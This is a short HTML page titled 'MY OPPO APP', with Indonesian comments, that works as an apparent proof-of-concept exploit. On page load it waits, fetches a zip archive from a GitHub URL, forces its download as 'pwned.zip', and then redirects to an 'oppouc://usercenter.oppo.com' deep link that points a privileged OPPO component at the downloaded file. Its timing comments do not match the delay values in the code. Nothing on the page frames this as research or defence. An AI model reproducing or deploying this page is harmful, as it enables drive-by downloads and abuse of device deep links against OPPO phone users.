<!DOCTYPE html>
<html>
<head>
    <script type="text/javascript">
        async function downloadFile(url, filename) {
            try {
                const response = await fetch(url);
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                const blob = await response.blob();
                const urlObject = URL.createObjectURL(blob);
                
                // Buat elemen <a> untuk mendownload file
                const a = document.createElement('a');
                a.href = urlObject;
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);

                // Berikan jeda 2 detik kemudian alihkan ke URL yang diinginkan
                setTimeout(function() {
                    window.location.replace('oppouc://usercenter.oppo.com/browser?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/pwned.zip');
                }, 30000); // 2000 milidetik = 2 detik

                // Revoke object URL after some delay to release memory
                setTimeout(function() {
                    URL.revokeObjectURL(urlObject);
                }, 60000); // 10 detik
            } catch (error) {
                // Menampilkan pesan kesalahan menggunakan alert
                alert('Error during file download: ' + error.message);
            }
        }

        window.onload = function() {
            setTimeout(function() {
                // Contoh penggunaan
                downloadFile('https://github.com/Tedixx/i/raw/i/i.zip', 'pwned.zip');
            }, 15000); // 2000 milidetik = 2 detik
        };
    </script>
</head>
<body>
    <h1>MY OPPO APP </h1>
</body>
</html>
